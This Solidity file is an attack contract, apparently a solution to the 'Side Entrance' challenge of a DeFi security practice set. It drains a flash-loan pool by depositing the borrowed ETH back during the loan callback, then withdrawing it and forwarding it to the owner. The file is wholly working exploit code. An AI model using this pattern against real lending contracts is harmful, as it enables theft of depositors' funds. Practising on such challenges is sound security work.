// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool lender;
    address payable owner;

    constructor(address payable _lender) {
        lender = SideEntranceLenderPool(_lender);
        owner = payable(msg.sender);
    }

    function attack() external {
        require(msg.sender == owner, "Only owner allowed");

        uint balance = address(lender).balance;
        lender.flashLoan(balance);
        lender.withdraw();
    }

    function execute() external payable {
        require(msg.sender == address(lender), "Only lender allowed");

        lender.deposit{value: msg.value}();
    }

    function destroyContract() external {
        require(msg.sender == owner, "Only owner allowed");

        // Transfer the contract's balance to the owner
        selfdestruct(owner);
    }

    // Allow deposits of ETH
    receive() external payable {}
}
